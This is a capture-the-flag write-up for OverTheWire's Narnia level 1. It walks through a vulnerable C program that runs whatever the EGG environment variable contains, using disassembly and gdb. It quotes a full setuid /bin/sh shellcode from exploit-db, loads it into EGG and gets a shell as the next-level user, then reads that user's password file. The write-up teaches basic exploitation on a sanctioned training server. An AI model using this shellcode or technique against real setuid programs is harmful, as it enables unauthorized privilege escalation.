#Narnia1

narnia.labs.overthewire.org

**Username:** narnia1
**Password:** see [narnia0](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria0)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Again, let's go ahead and run the program and see what it does.
>
>```
# ./narnia1  
Give me something to execute at the env-variable EGG  
>```
> Ok, it looks like we are going to be messing with environment variables.
>
> Let's go ahead and take a peek at the source:
>
>```C
>/*
>    This program is free software; you can redistribute it and/or modify
>    it under the terms of the GNU General Public License as published by
>    the Free Software Foundation; either version 2 of the License, or
>    (at your option) any later version.
>
>    This program is distributed in the hope that it will be useful,
>    but WITHOUT ANY WARRANTY; without even the implied warranty of
>    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
>    GNU General Public License for more details.
>
>    You should have received a copy of the GNU General Public License
>    along with this program; if not, write to the Free Software
>    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
>*/
>#include <stdio.h>
>
>int main(){
>	int (*ret)();
>
>	if(getenv("EGG")==NULL){    
>		printf("Give me something to execute at the env-variable EGG\n");
>		exit(1);
>	}
>
>	printf("Trying to execute EGG!\n");
>	ret = getenv("EGG");
>	ret();
>
>	return 0;
>}
>```
>
> This one looks straight forward, but at the same time, I don't quite know how ```getenv("EGG");``` is going to work.  What it looks like to someone who isn't the best ```C``` programmer is that we are going to read in the value of environment variable ```EGG``` and execute whatever is in there.  Let's try a basic command and see what it does.
>
>```
># export EGG=ls
># echo $EGG
>ls
># ./narnia1 
>Trying to execute EGG!
>Segmentation fault
>```
>
> Ok, clearly there is more going on here.  Let's bust out our dissassembler and see what's going on at the ```getenv("EGG");``` line.
>
>```asm
>             main:
>0804847d         push       ebp                                                 ; XREF=_start+23
>0804847e         mov        ebp, esp
>08048480         and        esp, 0xfffffff0
>08048483         sub        esp, 0x20
>08048486         mov        dword [ss:esp], 0x8048570                           ; argument "name" for method j_getenv
>0804848d         call       j_getenv
>08048492         test       eax, eax
>08048494         jne        0x80484ae
>
>08048496         mov        dword [ss:esp], 0x8048574                           ; "Give me something to execute at the env-variable EGG", argument "s" for method j_puts
>0804849d         call       j_puts
>080484a2         mov        dword [ss:esp], 0x1                                 ; argument "status" for method j_exit
>080484a9         call       j_exit
>
>080484ae         mov        dword [ss:esp], 0x80485a9                           ; "Trying to execute EGG!", argument "s" for method j_puts, XREF=main+23
>080484b5         call       j_puts
>080484ba         mov        dword [ss:esp], 0x8048570                           ; argument "name" for method j_getenv
>080484c1         call       j_getenv
>080484c6         mov        dword [ss:esp+0x1c], eax
>080484ca         mov        eax, dword [ss:esp+0x1c]
>080484ce         call       eax
>080484d0         mov        eax, 0x0
>080484d5         leave      
>080484d6         ret
>```
>
> Well, we can see the call to ```j_getenv``` at ```0x080484c1``` and there appears to be call directly after that at ```0x080484ce```.  Let's setup gdb and break at that point.
>
>```asm
># gdb narnia1
>(gdb) display/a $eax
>(gdb) break *0x080484ce
>Breakpoint 1 at 0x80484ce
>(gdb) run
>Starting program: /root/narnia1 
>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>Trying to execute EGG!
>
>Breakpoint 1, 0x080484ce in main ()
>1: /a $eax = 0xffffd806
>(gdb) x/100x $eax
>0xffffd806:	0x5500736c	0x3d524553	0x746f6f72	0x5f534c00
>0xffffd816:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964
>0xffffd826:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36
>0xffffd836:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a
>0xffffd846:	0x333b3130	0x6f643a35	0x3b31303d	0x623a3533
>0xffffd856:	0x30343d64	0x3b33333b	0x633a3130	0x30343d64
>0xffffd866:	0x3b33333b	0x6f3a3130	0x30343d72	0x3b31333b
>0xffffd876:	0x733a3130	0x37333d75	0x3a31343b	0x333d6773
>0xffffd886:	0x33343b30	0x3d61633a	0x343b3033	0x77743a31
>0xffffd896:	0x3b30333d	0x6f3a3234	0x34333d77	0x3a32343b
>0xffffd8a6:	0x333d7473	0x34343b37	0x3d78653a	0x333b3130
>0xffffd8b6:	0x2e2a3a32	0x3d726174	0x333b3130	0x2e2a3a31
>0xffffd8c6:	0x3d7a6774	0x333b3130	0x2e2a3a31	0x3d6a7261
>0xffffd8d6:	0x333b3130	0x2e2a3a31	0x3d7a6174	0x333b3130
>0xffffd8e6:	0x2e2a3a31	0x3d687a6c	0x333b3130	0x2e2a3a31
>0xffffd8f6:	0x616d7a6c	0x3b31303d	0x2a3a3133	0x7a6c742e
>0xffffd906:	0x3b31303d	0x2a3a3133	0x7a78742e	0x3b31303d
>0xffffd916:	0x2a3a3133	0x70697a2e	0x3b31303d	0x2a3a3133
>0xffffd926:	0x303d7a2e	0x31333b31	0x5a2e2a3a	0x3b31303d
>0xffffd936:	0x2a3a3133	0x3d7a642e	0x333b3130	0x2e2a3a31
>0xffffd946:	0x303d7a67	0x31333b31	0x6c2e2a3a	0x31303d7a
>0xffffd956:	0x3a31333b	0x7a782e2a	0x3b31303d	0x2a3a3133
>0xffffd966:	0x327a622e	0x3b31303d	0x2a3a3133	0x3d7a622e
>0xffffd976:	0x333b3130	0x2e2a3a31	0x3d7a6274	0x333b3130
>0xffffd986:	0x2e2a3a31	0x327a6274	0x3b31303d	0x2a3a3133
>```
>
> Ah, so it looks like our ```ls``` is at ```0xffffd808``` and ```ffffd809```.  At those two addresses we see the values ```0x73``` and ```0x6c``` respectively which translate back to ```s``` and ```l```.  So it looks like if we load valid shellcode into the ```EGG``` environment variable it should be executed as the ```call``` will basically be pointed to the shellcode itself. I'll just use some shellcode that I got out of exploit-db.
>
>```
># cat /usr/share/exploitdb/platforms/lin_x86/shellcode/13333.txt
>-------------------[ASM]----------------------
>
>global _start
>section .text
>_start:
>;setuid(0)
>xor ebx,ebx
>lea eax,[ebx+17h]
>cdq
>int 80h
>;execve("/bin/sh",0,0)
>xor ecx,ecx
>push ecx
>push 0x68732f6e
>push 0x69622f2f
>lea eax,[ecx+0Bh]
>mov ebx,esp
>int 80h
>
>-------------------[/ASM]----------------------
>
>-------------------[C]----------------------
>
>#include <stdio.h>
>
>const char shellcode[]= "\x31\xdb"
>            "\x8d\x43\x17"
>            "\x99"
>            "\xcd\x80"
>            "\x31\xc9"
>            "\x51"
>            "\x68\x6e\x2f\x73\x68"
>            "\x68\x2f\x2f\x62\x69"
>            "\x8d\x41\x0b"
>            "\x89\xe3"
>            "\xcd\x80";
>
>int main()
>{
>    printf <http://www.opengroup.org/onlinepubs/009695399/functions/printf.html>("\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE"
>            "WITHOUT NULLS THAT SPAWNS A SHELL"
>            "\n\nCoded by Chema Garcia (aka sch3m4)"
>            "\n\t + sch3m4@opensec.es"
>            "\n\t + http://opensec.es"
>            "\n\n[+] Date: 29/11/2008"
>            "\n[+] Thanks to: vlan7"
>            "\n\n[+] Shellcode Size: %d bytes\n\n",
>            sizeof(shellcode)-1);
>
>    (*(void (*)()) shellcode)();
>
>    return 0;
>}
>
>-------------------[C]---------------------- 
>
># milw0rm.com [2008-11-13]
>```
>
> Now for the delivery.  We can't just type out the shellcode into the environment variable, so like narnia0 we'll turn to python.  To do this we will just nest the command so that it will execute and print the appropriate values into the environment variable.
>
>```
># export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
># echo $EGG
>1ۍC�̀1�Qhn/shh//bi�A
>                    ��̀
>```
>
> That looks about right, let's move to the server and run it.
>
>```
>narnia1@melinda:/narnia$ export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
>narnia1@melinda:/narnia$ ./narnia1
>Trying to execute EGG!
>$ whoami
>narnia2
>$ cat /etc/narnia_pass/narnia2
>**********
>$ 
>```
>
> On to narnia2.
